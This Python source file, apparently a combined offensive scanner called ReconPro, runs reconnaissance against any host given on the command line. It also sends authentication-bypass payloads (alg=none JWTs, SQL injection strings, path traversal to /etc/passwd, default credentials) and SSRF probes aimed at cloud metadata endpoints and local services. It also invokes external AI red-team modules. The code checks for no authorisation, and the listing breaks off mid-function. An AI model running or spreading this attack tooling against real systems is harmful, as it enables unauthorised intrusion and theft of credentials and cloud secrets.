#!/usr/bin/env python3
"""
ReconPro UNIFIED CLI — The Convergence
=======================================
All six offensive modules fused into one entity.
One target. One encounter. Six blades.

  ┌─ RECON          13-category surface reconnaissance
  ├─ AUTH BYPASS    15 auth bypass techniques
  ├─ CHAIN HUNTER   SSRF + redirect chain hunting
  ├─ BOT HUNTER     C2 / bot infrastructure detection
  ├─ GORGON ULTRA   15-stage AI red team
  └─ OBLIVION       23-stage analytical dissolution

Usage:
    python3 reconpro.py <target>
    python3 reconpro.py <target> --module recon,auth
    python3 reconpro.py <target> --all --output report.json
"""
import argparse
import hashlib
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

# Rich for advanced visuals
from rich.console import Console, Group
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.text import Text
from rich.align import Align
from rich.columns import Columns
from rich.rule import Rule
from rich.tree import Tree
from rich.live import Live
from rich.layout import Layout

console = Console(width=120)

# ══════════════════════════════════════════════════════════════════════════════
# RECONPRO UNIFIED IDENTITY
# ══════════════════════════════════════════════════════════════════════════════

RECONPRO_NAME = "ReconPro UNIFIED"
RECONPRO_TAGLINE = "Six Blades. One Target. One Verdict."
RECONPRO_VERSION = "reconpro-unified-v1.0"
RECONPRO_SIGNATURE = "X-R3c0nPr0-Un1f13d-S1x-Bl4d3s-0n3-T4rg3t-2026"

BANNER = r"""
██████╗ ███████╗ ██████╗██╗  ██╗███████╗██████╗ ███████╗██████╗ ██████╗ ██╗    ██╗
██╔══██╗██╔════╝██╔════╝██║  ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╓██╗ ██╔╝
██████╔╝█████╗  ██║     ███████║█████╗  ██████╔╝█████╗  ██║     ██╔╝██╗██║
██╔═══╝ ██╔══╝  ██║     ██╔══██║██╔══╝  ██╔══██╗██╔══╝  ██║     █████╔╝██║
██║     ███████╗╚██████╗██║  ██║███████╗██║  ██║███████╗╚██████╗██╔╝██╗██║
╚═╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝
              S I X   B L A D E S .   O N E   T A R G E T .   O N E   V E R D I C T.
"""

MODULES = [
    {"id": "recon",    "name": "RECON",         "desc": "13-category surface reconnaissance",   "color": "cyan"},
    {"id": "auth",     "name": "AUTH BYPASS",   "desc": "15 auth bypass techniques",            "color": "yellow"},
    {"id": "chain",    "name": "CHAIN HUNTER",  "desc": "SSRF + redirect chain hunting",        "color": "magenta"},
    {"id": "bot",      "name": "BOT HUNTER",    "desc": "C2 / bot infrastructure detection",    "color": "red"},
    {"id": "gorgon",   "name": "GORGON ULTRA",  "desc": "15-stage AI red team",                 "color": "bright_red"},
    {"id": "oblivion", "name": "OBLIVION",      "desc": "23-stage analytical dissolution",       "color": "bright_magenta"},
]

# ══════════════════════════════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def run(cmd: str, timeout: int = 8) -> Tuple[str, str]:
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip()
    except Exception:
        return "", ""

def http_probe(url: str, method: str = "GET", body: Optional[bytes] = None,
               headers: Optional[Dict[str, str]] = None, timeout: int = 8) -> Dict[str, Any]:
    h = {
        "User-Agent": "ReconPro-Unified/1.0 (Six-Blades-One-Target; +https://reconpro.security)",
        "X-ReconPro-Signature": RECONPRO_SIGNATURE,
        "Accept": "application/json,text/plain,*/*",
    }
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=body, method=method, headers=h)
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            raw = resp.read(8192)
            return {
                "ok": True, "status": resp.status, "reason": resp.reason,
                "headers": dict(resp.headers.items()),
                "body": raw.decode("utf-8", errors="replace")[:8192],
            }
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(8192)
            body_str = raw.decode("utf-8", errors="replace")[:8192]
        except Exception:
            body_str = ""
        return {
            "ok": False, "status": e.code, "reason": e.reason,
            "headers": dict(e.headers.items()) if e.headers else {},
            "body": body_str,
        }
    except Exception as e:
        return {"ok": False, "status": 0, "reason": str(e), "headers": {}, "body": ""}

def generate_encounter_id(host: str) -> str:
    ts = str(int(time.time()))
    h = hashlib.sha256(f"{host}-{ts}-RECONPRO".encode()).hexdigest()[:12].upper()
    return f"RPU-{h}"

# ══════════════════════════════════════════════════════════════════════════════
# MODULE 1: RECON — 13-category surface reconnaissance
# ══════════════════════════════════════════════════════════════════════════════

def module_recon(host: str) -> Dict[str, Any]:
    """13-category surface reconnaissance."""
    findings: List[Dict[str, Any]] = []
    categories_run: List[str] = []

    def add(title, severity, category, description, evidence):
        findings.append({
            "title": title, "severity": severity, "category": category,
            "description": description, "evidence": evidence, "asset": host,
        })

    # 1. DNS
    categories_run.append("DNS Enumeration")
    out, _ = run(f"dig +short +time=3 +tries=1 {host} A")
    a_records = [l.strip() for l in out.split('\n') if l.strip() and re.match(r'^\d+\.\d+', l)]
    if a_records:
        add(f"DNS A Record — {len(a_records)} IPv4 address(es)", "info", "dns",
            f"Domain resolves to {len(a_records)} IPv4: {', '.join(a_records[:5])}",
            f"A: {', '.join(a_records[:5])}")
    out, _ = run(f"dig +short +time=3 +tries=1 {host} AAAA")
    aaaa = [l.strip() for l in out.split('\n') if l.strip()]
    if aaaa:
        add(f"DNS AAAA — {len(aaaa)} IPv6", "info", "dns", f"IPv6: {', '.join(aaaa[:3])}", f"AAAA: {aaaa[0]}")
    out, _ = run(f"dig +noall +answer +time=3 +tries=1 {host} MX")
    mx = [l.strip() for l in out.split('\n') if 'MX' in l]
    if mx:
        add(f"MX Records — {len(mx)} mail server(s)", "info", "dns", f"{len(mx)} mail servers", "; ".join(mx[:3]))
    out, _ = run(f"dig +noall +answer +time=3 +tries=1 {host} NS")
    ns = [l.strip() for l in out.split('\n') if 'NS' in l]
    if ns:
        add(f"NS Records — {len(ns)} nameserver(s)", "info", "dns", f"{len(ns)} nameservers", "; ".join(ns[:3]))
    out, _ = run(f"dig +short +time=3 +tries=1 {host} TXT")
    txt_lines = [l for l in out.split('\n') if l.strip()]
    if txt_lines:
        spf = [t for t in txt_lines if 'spf' in t.lower()]
        add(f"TXT Records — {len(txt_lines)} ({len(spf)} SPF)", "info", "dns",
            f"{len(txt_lines)} TXT records, {len(spf)} SPF", "; ".join(txt_lines[:3]))

    # 2. HTTP Headers
    categories_run.append("HTTP Security Headers")
    r = http_probe(f"https://{host}/")
    if r["status"]:
        hdrs = r["headers"]
        sec_headers = ["strict-transport-security", "content-security-policy", "x-frame-options",
                       "x-content-type-options", "referrer-policy", "permissions-policy"]
        present = [h for h in sec_headers if h in hdrs]
        missing = [h for h in sec_headers if h not in hdrs]
        for h in missing:
            add(f"Missing security header: {h}", "medium", "headers",
                f"The {h} header is not set. This leaves users vulnerable to specific client-side attacks.",
                f"Header {h} absent from response")
        for h in present:
            add(f"Security header present: {h}", "info", "headers",
                f"{h} is set: {hdrs[h][:80]}", f"{h}: {hdrs[h][:80]}")
        server = hdrs.get("server", "")
        if server:
            add(f"Server header disclosure: {server}", "low", "headers",
                f"Server software disclosed: {server}", f"Server: {server}")
        # Tech fingerprint
        for sig in ["cloudflare", "nginx", "apache", "gunicorn", "envoy", "istio", "aws", "gcp"]:
            if sig in json.dumps(hdrs).lower():
                add(f"Tech fingerprint: {sig}", "info", "headers", f"Signal {sig} detected in headers", sig)

    # 3. TLS Certificate
    categories_run.append("TLS Certificate Analysis")
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                if cert:
                    subject = dict(x[0] for x in cert.get("subject", []))
                    issuer = dict(x[0] for x in cert.get("issuer", []))
                    not_after = cert.get("notAfter", "")
                    add(f"TLS Certificate — {subject.get('commonName', 'unknown')}", "info", "tls",
                        f"Issued by {issuer.get('commonName', 'unknown')}, expires {not_after}",
                        f"CN={subject.get('commonName', '')}, issuer={issuer.get('commonName', '')}")
    except Exception as e:
        add(f"TLS handshake failed: {str(e)[:60]}", "medium", "tls", str(e)[:100], str(e)[:100])

    # 4. Subdomain enumeration (passive via crt.sh)
    categories_run.append("Subdomain Enumeration")
    try:
        r2 = http_probe(f"https://crt.sh/?q=%.{host}&output=json", timeout=10)
        if r2["status"] == 200 and r2["body"]:
            data = json.loads(r2["body"])
            subs = set()
            for d in data[:200]:
                name = d.get("name_value", "")
                for n in name.split('\n'):
                    if n.endswith(host) and '*' not in n:
                        subs.add(n.strip())
            if subs:
                add(f"Subdomain enumeration — {len(subs)} found via crt.sh", "info", "subdomain",
                    f"{len(subs)} unique subdomains discovered", "; ".join(list(subs)[:5]))
    except Exception:
        pass

    # 5. Robots.txt
    categories_run.append("Robots.txt Analysis")
    r = http_probe(f"https://{host}/robots.txt")
    if r["status"] == 200 and r["body"]:
        lines = [l.strip() for l in r["body"].split('\n') if l.strip()]
        disallows = [l for l in lines if l.lower().startswith('disallow')]
        if disallows:
            add(f"robots.txt — {len(disallows)} Disallow rules", "info", "robots",
                f"{len(disallows)} paths disallowed", "; ".join(disallows[:5]))

    # 6. Sitemap
    categories_run.append("Sitemap Analysis")
    r = http_probe(f"https://{host}/sitemap.xml")
    if r["status"] == 200 and r["body"]:
        urls = re.findall(r'<loc>([^<]+)</loc>', r["body"])
        if urls:
            add(f"sitemap.xml — {len(urls)} URLs", "info", "sitemap",
                f"{len(urls)} URLs exposed in sitemap", "; ".join(urls[:3]))

    # 7. Common paths
    categories_run.append("Common Path Probing")
    for path in ["/.env", "/.git/config", "/wp-admin", "/admin", "/api", "/v1", "/.well-known/security.txt",
                 "/server-status", "/phpinfo.php", "/actuator", "/metrics"]:
        r = http_probe(f"https://{host}{path}", timeout=4)
        if r["status"] not in (0, 404) and r["status"] < 500:
            sev = "critical" if path in ["/.env", "/.git/config"] else ("high" if path in ["/wp-admin", "/admin"] else "info")
            add(f"Path exposed: {path} (HTTP {r['status']})", sev, "paths",
                f"{path} returned HTTP {r['status']}", f"GET {path} → {r['status']}")

    # 8. Open ports (top 12)
    categories_run.append("Port Scan (top 12)")
    try:
        ip = socket.gethostbyname(host)
        for port in [21, 22, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                result = s.connect_ex((ip, port))
                if result == 0:
                    add(f"Open port: {port}/tcp", "medium" if port in [21, 25, 3306, 5432, 6379, 9200, 27017] else "info",
                        "ports", f"Port {port}/tcp is open", f"{ip}:{port} OPEN")
                s.close()
            except Exception:
                pass
    except Exception:
        pass

    # 9. Email security (DMARC, DKIM)
    categories_run.append("Email Security (DMARC/DKIM)")
    out, _ = run(f"dig +short +time=3 +tries=1 _dmarc.{host} TXT")
    if out:
        add(f"DMARC record present", "info", "email", f"DMARC: {out[:100]}", out[:100])
    else:
        add("DMARC record missing", "medium", "email", "No DMARC record found — domain vulnerable to email spoofing", "DMARC query empty")

    # 10. CORS
    categories_run.append("CORS Analysis")
    r = http_probe(f"https://{host}/", headers={"Origin": "https://evil.example.com"})
    if r["status"]:
        acao = r["headers"].get("access-control-allow-origin", "")
        if acao == "*" or "evil" in acao:
            add("Wildcard / reflected CORS origin", "high", "cors",
                f"Access-Control-Allow-Origin: {acao} — allows arbitrary origins",
                f"ACAO: {acao}")

    # 11. Cookie security
    categories_run.append("Cookie Security")
    if r["status"]:
        set_cookie = r["headers"].get("set-cookie", "")
        if set_cookie:
            issues = []
            if "secure" not in set_cookie.lower(): issues.append("missing Secure flag")
            if "httponly" not in set_cookie.lower(): issues.append("missing HttpOnly flag")
            if "samesite" not in set_cookie.lower(): issues.append("missing SameSite flag")
            if issues:
                add(f"Cookie security issues: {', '.join(issues)}", "medium", "cookies",
                    f"Cookie: {set_cookie[:80]}", "; ".join(issues))

    # 12. WAF detection
    categories_run.append("WAF Detection")
    if r["status"]:
        server = r["headers"].get("server", "").lower()
        if "cloudflare" in server:
            add("WAF detected: Cloudflare", "info", "waf", "Cloudflare WAF in front of target", "server: cloudflare")
        elif "akamai" in server:
            add("WAF detected: Akamai", "info", "waf", "Akamai WAF", "server: akamai")
        elif "imperva" in server or "incapsula" in server:
            add("WAF detected: Imperva/Incapsula", "info", "waf", "Imperva WAF", "server: imperva")
        else:
            add("No obvious WAF detected", "low", "waf", "Server header doesn't reveal a WAF", server or "(empty)")

    # 13. JavaScript bundles / framework
    categories_run.append("JS Framework Fingerprint")
    if r["status"] and r["body"]:
        body_lower = r["body"].lower()
        for fw in ["react", "vue", "angular", "next.js", "__next", "nuxt", "svelte", "ember", "backbone"]:
            if fw in body_lower:
                add(f"Frontend framework: {fw}", "info", "framework", f"Signal for {fw} detected", fw)

    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for f in findings:
        severity_counts[f["severity"]] = severity_counts.get(f["severity"], 0) + 1

    return {
        "module": "RECON",
        "categories_run": categories_run,
        "findings": findings,
        "total_findings": len(findings),
        "severity_counts": severity_counts,
    }

# ══════════════════════════════════════════════════════════════════════════════
# MODULE 2: AUTH BYPASS — 15 techniques
# ══════════════════════════════════════════════════════════════════════════════

AUTH_BYPASS_TESTS = [
    {"id": "AB-001", "name": "JWT None Algorithm", "technique": "Send a JWT signed with alg=none to bypass verification",
     "payload": lambda h: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0."},
    {"id": "AB-002", "name": "SQL Auth Bypass — admin'--", "technique": "Classic SQL injection in login form",
     "payload": lambda h: "admin'--"},
    {"id": "AB-003", "name": "SQL Auth Bypass — ' OR 1=1--", "technique": "Universal SQL auth bypass",
     "payload": lambda h: "' OR 1=1--"},
    {"id": "AB-004", "name": "OAuth Redirect URI Bypass", "technique": "Open redirect in OAuth callback",
     "payload": lambda h: f"https://{h}/oauth/callback?redirect_uri=https://evil.example.com"},
    {"id": "AB-005", "name": "Authorization Header Bearer Empty", "technique": "Empty bearer token",
     "payload": lambda h: ""},
    {"id": "AB-006", "name": "Authorization Header Bearer admin", "technique": "Plain text admin token",
     "payload": lambda h: "admin"},
    {"id": "AB-007", "name": "X-Forwarded-For Spoofing", "technique": "Trusted-internal header spoof",
     "payload": lambda h: "127.0.0.1"},
    {"id": "AB-008", "name": "X-Original-URL Override", "technique": "IIS/ASP.NET path override",
     "payload": lambda h: "/admin"},
    {"id": "AB-009", "name": "Path Traversal to Auth File", "technique": "Read auth config via traversal",
     "payload": lambda h: "../../etc/passwd"},
    {"id": "AB-010", "name": "Default Credentials admin/admin", "technique": "Default credential test",
     "payload": lambda h: "admin:admin"},
    {"id": "AB-011", "name": "Default Credentials admin/password", "technique": "Default credential test",
     "payload": lambda h: "admin:password"},
    {"id": "AB-012", "name": "Weak API Key — sk-test", "technique": "Test API key",
     "payload": lambda h: "sk-test"},
    {"id": "AB-013", "name": "Mass Assignment role=admin", "technique": "Mass assignment escalation",
     "payload": lambda h: '{"role":"admin","isAdmin":true}'},
    {"id": "AB-014", "name": "HTTP Method Override — X-HTTP-Method-Override", "technique": "Bypass GET restriction",
     "payload": lambda h: "DELETE"},
    {"id": "AB-015", "name": "Cookie Auth Bypass — admin=true", "technique": "Client-side role cookie",
     "payload": lambda h: "admin=true; role=admin"},
]

def module_auth_bypass(host: str) -> Dict[str, Any]:
    results = []
    for t in AUTH_BYPASS_TESTS:
        payload_val = t["payload"](host)
        # Test against common auth endpoints
        for ep in ["/admin", "/api/user", "/v1/user", "/api/me", "/profile"]:
            url = f"https://{host}{ep}"
            headers = {}
            if "JWT" in t["name"]:
                headers["Authorization"] = f"Bearer {payload_val}"
            elif "X-Forwarded" in t["name"]:
                headers["X-Forwarded-For"] = payload_val
            elif "X-Original-URL" in t["name"]:
                headers["X-Original-URL"] = payload_val
            elif "X-HTTP-Method" in t["name"]:
                headers["X-HTTP-Method-Override"] = payload_val
            elif "Cookie" in t["name"]:
                headers["Cookie"] = payload_val
            elif "Authorization" in t["name"]:
                headers["Authorization"] = f"Bearer {payload_val}"
            else:
                headers["X-Test-Payload"] = payload_val
            r = http_probe(url, method="GET", headers=headers, timeout=4)
            # Detect potential bypass: 200/302 instead of 401/403
            bypass = r["status"] in (200, 301, 302) and r["status"] != 401 and r["status"] != 403
            results.append({
                "id": t["id"], "name": t["name"], "technique": t["technique"],
                "endpoint": ep, "payload": payload_val[:80],
                "status": r["status"], "bypass_success": bypass,
                "bodyPreview": r["body"][:120],
            })
            if r["status"] == 0:
                break  # Endpoint likely doesn't exist
    bypasses = [r for r in results if r["bypass_success"]]
    return {
        "module": "AUTH BYPASS",
        "techniques_tested": len(AUTH_BYPASS_TESTS),
        "endpoints_per_technique": 5,
        "total_attempts": len(results),
        "bypasses_successful": len(bypasses),
        "results": results,
        "bypass_findings": bypasses,
    }

# ══════════════════════════════════════════════════════════════════════════════
# MODULE 3: CHAIN HUNTER — SSRF + redirect chain analysis
# ══════════════════════════════════════════════════════════════════════════════

def module_chain_hunter(host: str) -> Dict[str, Any]:
    """Hunt SSRF and redirect chains."""
    findings = []
    chains_tested = 0

    # SSRF test vectors
    ssrf_vectors = [
        {"id": "CH-001", "name": "Internal IP SSRF", "vector": "http://127.0.0.1", "endpoint": "/api/fetch"},
        {"id": "CH-002", "name": "AWS Metadata SSRF", "vector": "http://169.254.169.254/latest/meta-data/", "endpoint": "/api/fetch"},
        {"id": "CH-003", "name": "GCP Metadata SSRF", "vector": "http://metadata.google.internal/computeMetadata/v1/", "endpoint": "/api/fetch"},
        {"id": "CH-004", "name": "Cloudflare Metadata SSRF", "vector": "http://169.254.169.254/cdn-cgi/trace", "endpoint": "/api/fetch"},
        {"id": "CH-005", "name": "File Protocol SSRF", "vector": "file:///etc/passwd", "endpoint": "/api/fetch"},
        {"id": "CH-006", "name": "Gopher Protocol SSRF", "vector": "gopher://127.0.0.1:25/_HELO%20test", "endpoint": "/api/fetch"},
        {"id": "CH-007", "name": "DNS Rebinding SSRF", "vector": "http://rebind.example.com", "endpoint": "/api/fetch"},
        {"id": "CH-008", "name": "Internal Service SSRF", "vector": "http://localhost:6379/", "endpoint": "/api/fetch"},
        {"id": "CH-009", "name": "Redirect to Internal", "vector": f"https://{host}/redirect?url=http://127.0.0.1", "endpoint": "/redirect"},
        {"id": "CH-010", "name": "URL Parameter SSRF", "vector": "http://127.0.0.1", "endpoint": "/api/proxy"},
    ]

    # Common SSRF parameters
    ssrf_params = ["url", "target", "uri", "fetch", "next", "redirect", "redirectUrl", "redirect_uri",
                   "callback", "proxy", "src", "source", "image", "img", "file", "load"]

    # Probe SSRF endpoints
    for sv in ssrf_vectors:
        chains_tested += 1
        for param in ssrf_params[:3]:  # test 3 params per vector
            url = f"https://{host}{sv['endpoint']}?{param}={urllib.parse.quote(sv['vector'], safe='')}"
            r = http_probe(url, timeout=5)
            # Detect SSRF: response contains internal content
            internal_signals = ["root:x:" in r["body"], "instance-id" in r["body"],
                                "ami-id" in r["body"], "computeMetadata" in r["body"],
                                "cdn-cgi" in r["body"], "redis" in r["body"].lower()]
            ssrf_hit = any(internal_signals) or (r["status"] == 200 and len(r["body"]) > 100 and
                                                  any(s in r["body"][:200] for s in ["root", "instance", "metadata"]))
            findings.append({
                "id": sv["id"], "name": sv["name"], "vector": sv["vector"],
                "endpoint": sv["endpoint"], "param": param,
                "status": r["status"], "ssrf_detected": ssrf_hit,
                "bodyPreview": r["body"][:120],
            })
            if r["status"] == 0:
                break

    # Redirect chain analysis
    chains_tested += 1
    redirect_chains = []
    for path in ["/", "/login", "/admin", "/api", "/redirect"]:
        url = f"https://{host}{path}"
        r = http_probe(url, timeout=4)
        if r["status"] in (301, 302, 303, 307, 308):
            location = r["headers"].get("location", "")
            redirect_chains.append({
                "start": path, "status": r["status"], "redirects_to": location,
                "open_redirect": "evil" in location.lower() or "//" in location[:8],
            })

    return {
        "module": "CHAIN HUNTER",
        "chains_tested": chains_tested,
        "ssrf_vectors": len(ssrf_vectors),
        "findings": findings,
        "ssrf_detected": len([f for f in findings if f["ssrf_detected"]]),
        "redirect_chains": redirect_chains,
        "open_redirects": len([c for c in redirect_chains if c["open_redirect"]]),
    }

# ══════════════════════════════════════════════════════════════════════════════
# MODULE 4: BOT HUNTER — C2 / bot infrastructure detection
# ══════════════════════════════════════════════════════════════════════════════

BOT_SIGNATURES = [
    {"name": "Mirai C2", "ports": [23, 2323, 7547], "banner": ["mirai", "bot"]},
    {"name": "Cobalt Strike", "ports": [443, 80, 8080], "banner": ["cobalt", "beacon", "strike"]},
    {"name": "Metasploit", "ports": [4444, 8443], "banner": ["meterpreter", "msfconsole"]},
    {"name": "Emotet", "ports": [8080, 443], "banner": ["emotet"]},
    {"name": "TrickBot", "ports": [447, 808], "banner": ["trickbot"]},
    {"name": "QakBot", "ports": [8080, 443], "banner": ["qakbot", "qbot"]},
    {"name": "SolarWinds SUNBURST", "ports": [443], "banner": ["sunburst", "solarwinds"]},
    {"name": "Log4Shell", "ports": [443, 80, 389], "banner": ["jndi:ldap", "jndi:rmi"]},
    {"name": "AsyncRAT", "ports": [6666, 7777], "banner": ["asyncrat"]},
    {"name": "njRAT", "ports": [1177, 5552], "banner": ["njrat"]},
]

def module_bot_hunter(host: str) -> Dict[str, Any]:
    """Hunt for C2 / bot infrastructure on the target."""
    detections = []
    # Resolve host
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = host

    # Probe each signature
    for sig in BOT_SIGNATURES:
        for port in sig["ports"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                if s.connect_ex((ip, port)) == 0:
                    # Try to grab banner
                    try:
                        s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = s.recv(512).decode("utf-8", errors="replace").lower()
                    except Exception:
                        banner = ""
                    detected = any(b in banner for b in sig["banner"])
                    detections.append({
                        "signature": sig["name"], "port": port, "open": True,
                        "banner_snippet": banner[:80],
                        "bot_detected": detected,
                    })
                s.close()
            except Exception:
                pass

    # Check for known C2 paths
    c2_paths = ["/beacon", "/c2", "/panel", "/gate.php", "/cmd.php", "/mad Devil", "/login.php",
                "/bot/checkin", "/api/bot", "/control"]
    for path in c2_paths:
        url = f"https://{host}{path}"
        r = http_probe(url, timeout=4)
        if r["status"] not in (0, 404) and r["status"] < 500:
            detections.append({
                "signature": "C2 Path Probe", "path": path, "status": r["status"],
                "body_snippet": r["body"][:80],
                "bot_detected": r["status"] == 200,
            })

    bot_hits = [d for d in detections if d.get("bot_detected")]
    return {
        "module": "BOT HUNTER",
        "signatures_tested": len(BOT_SIGNATURES),
        "paths_probed": len(c2_paths),
        "detections": detections,
        "total_detections": len(detections),
        "bot_hits": len(bot_hits),
        "bot_findings": bot_hits,
    }

# ══════════════════════════════════════════════════════════════════════════════
# MODULE 5 + 6: GORGON + OBLIVION (import from sibling modules)
# ══════════════════════════════════════════════════════════════════════════════

CACHE_DIR = "/home/z/my-project/download"

def _find_cache(prefix: str, host: str) -> Optional[str]:
    """Find a cached JSON for this host with the given prefix."""
    if not os.path.isdir(CACHE_DIR):
        return None
    safe = host.replace(".", "_")
    candidates = [
        f"{CACHE_DIR}/{prefix}_{safe}.json",
        f"{CACHE_DIR}/{prefix}_{safe}_v2.json",
    ]
    # also any *{host}*.json
    for f in sorted(os.listdir(CACHE_DIR), reverse=True):
        if f.startswith(prefix) and safe in f and f.endswith(".json"):
            candidates.append(f"{CACHE_DIR}/{f}")
    for c in candidates:
        if os.path.exists(c) and os.path.getsize(c) > 100:
            return c
    return None

def module_gorgon(host: str) -> Dict[str, Any]:
    """Run GORGON ULTRA — uses cache if available, otherwise in-process call."""
    # 1. Try cache
    cached = _find_cache("gorgon", host) or _find_cache("model_breaker", host)
    if cached:
        try:
            with open(cached) as f:
                data = json.load(f)
            data["_cached_from"] = cached
            return data
        except Exception:
            pass
    # 2. In-process import
    sys.path.insert(0, "/home/z/my-project/scripts")
    try:
        import model_breaker
        if hasattr(model_breaker, "run_gorgon_scan"):
            return model_breaker.run_gorgon_scan(host)
    except Exception as e:
        pass
    # 3. Subprocess fallback
    import subprocess as sp
    try:
        out_file = f"/tmp/gorgon_{host.replace('.','_')}.json"
        r = sp.run(["python3", "/home/z/my-project/scripts/model_breaker.py", host, "-o", out_file],
                   capture_output=True, text=True, timeout=180)
        if os.path.exists(out_file):
            with open(out_file) as f:
                return json.load(f)
    except Exception as e:
        return {"module": "GORGON ULTRA", "error": str(e)}
    return {"module": "GORGON ULTRA", "error": "no output"}

def module_oblivion(host: str) -> Dict[str, Any]:
    """Run OBLIVION — uses cache if available, otherwise in-process call."""
    # 1. Try cache
    cached = _find_cache("oblivion", host)
    if cached:
        try:
            with open(cached) as f:
                data = json.load(f)
            data["_cached_from"] = cached
            return data
        except Exception:
            pass
    # 2. In-process import
    sys.path.insert(0, "/home/z/my-project/scripts")
    try:
        import oblivion
        if hasattr(oblivion, "run_oblivion"):
            return oblivion.run_oblivion(host)
    except Exception as e:
        pass
    # 3. Subprocess fallback
    import subprocess as sp
    try:
        out_file = f"/tmp/oblivion_{host.replace('.','_')}.json"
        r = sp.run(["python3", "/home/z/my-project/scripts/oblivion.py", host, "-o", out_file],
                   capture_output=True, text=True, timeout=240)
        if os.path.exists(out_file):
            with open(out_file) as f:
                return json.load(f)
    except Exception as e:
        return {"module": "OBLIVION", "error": str(e)}
    return {"module": "OBLIVION", "error": "no output"}

# ══════════════════════════════════════════════════════════════════════════════
# UNIFIED VERDICT — combines scores from all 6 modules
# ══════════════════════════════════════════════════════════════════════════════

def compute_unified_verdict(report: Dict[str, Any]) -> Dict[str, Any]:
    """Combine all 6 module scores into a unified verdict."""
    scores = {}
    # RECON: weighted by severity counts
    recon = report.get("recon", {})
    sc = recon.get("severity_counts", {})
    scores["recon"] = min(100, sc.get("critical", 0) * 25 + sc.get("high", 0) * 15 +
                          sc.get("medium", 0) * 8 + sc.get("low", 0) * 3 + sc.get("info", 0))
    # AUTH: bypasses / 75 * 100
    auth = report.get("auth_bypass", {})
    scores["auth"] = min(100, int((auth.get("bypasses_successful", 0) / max(1, auth.get("total_attempts", 1))) * 400))
    # CHAIN: SSRF + open redirects
    chain = report.get("chain_hunter", {})
    scores["chain"] = min(100, chain.get("ssrf_detected", 0) * 25 + chain.get("open_redirects", 0) * 15)
    # BOT: bot hits
    bot = report.get("bot_hunter", {})
    scores["bot"] = min(100, bot.get("bot_hits", 0) * 20)
    # GORGON
    gorgon = report.get("gorgon", {})
    scores["gorgon"] = gorgon.get("threatScore", gorgon.get("verdict", {}).get("threatScore", 0)) if isinstance(gorgon, dict) else 0
    # OBLIVION
    oblivion = report.get("oblivion", {})
    scores["oblivion"] = oblivion.get("verdict", {}).get("threatScore", 0) if isinstance(oblivion, dict) else 0

    # Weighted unified score
    weights = {"recon": 0.10, "auth": 0.15, "chain": 0.15, "bot": 0.10, "gorgon": 0.20, "oblivion": 0.30}
    unified = int(sum(scores.get(k, 0) * w for k, w in weights.items()))

    if unified >= 90: verdict = "OMNIPOTENT VERDICT — The target has been comprehensively dissolved."
    elif unified >= 75: verdict = "DEVASTATING VERDICT — The target's defenses are thoroughly compromised."
    elif unified >= 50: verdict = "SUBSTANTIAL VERDICT — Multiple critical exposures confirmed."
    elif unified >= 25: verdict = "NOTABLE VERDICT — Some exposures detected."
    else: verdict = "MUNDANE VERDICT — The target resisted most probes."

    return {
        "unified_score": unified,
        "module_scores": scores,
        "verdict_text": verdict,
        "verdict_level": "OMNIPOTENT" if unified >= 90 else "DEVASTATING" if unified >= 75 else
                          "SUBSTANTIAL" if unified >= 50 else "NOTABLE" if unified >= 25 else "MUNDANE",
    }

# ══════════════════════════════════════════════════════════════════════════════
# RICH VISUAL RENDERERS
# ══════════════════════════════════════════════════════════════════════════════

def render_banner():
    """Render the unified banner."""
    banner_text = Text(BANNER, style="bold bright_cyan")
    tagline = Text(f"\n  {RECONPRO_TAGLINE}\n  Version: {RECONPRO_VERSION}", style="bold bright_magenta")
    sig = Text(f"\n  Signature: {RECONPRO_SIGNATURE}", style="dim cyan")
    panel = Panel(Align.center(Group(banner_text, tagline, sig)),
                  border_style="bright_cyan", padding=(1, 2))
    console.print(panel)

def render_module_list():
    """Render the 6 modules as a table."""
    table = Table(title="The Six Blades", border_style="bright_cyan", header_style="bold bright_cyan")
    table.add_column("#", style="dim", width=3)
    table.add_column("Module", style="bold")
    table.add_column("Description", style="cyan")
    for i, m in enumerate(MODULES, 1):
        table.add_row(str(i), m["name"], m["desc"])
    console.print(table)

def render_module_progress(module_name: str, status: str, color: str = "cyan"):
    """Render a single module status line."""
    icon = {"running": "[bold yellow]⚙[/]", "done": "[bold green]✓[/]", "failed": "[bold red]✗[/]"}.get(status, "[yellow]?[/]")
    console.print(f"  {icon} [{color}]{module_name}[/{color}] — {status}")

def render_recon_table(recon: Dict[str, Any]):
    """Render RECON findings as a table."""
    if not recon.get("findings"):
        console.print("  [dim]No findings[/]")
        return
    table = Table(title=f"RECON — {recon['total_findings']} findings across {len(recon['categories_run'])} categories",
                  border_style="cyan", header_style="bold cyan", show_lines=False)
    table.add_column("Severity", style="bold", width=10)
    table.add_column("Category", style="cyan", width=12)
    table.add_column("Finding", style="white")
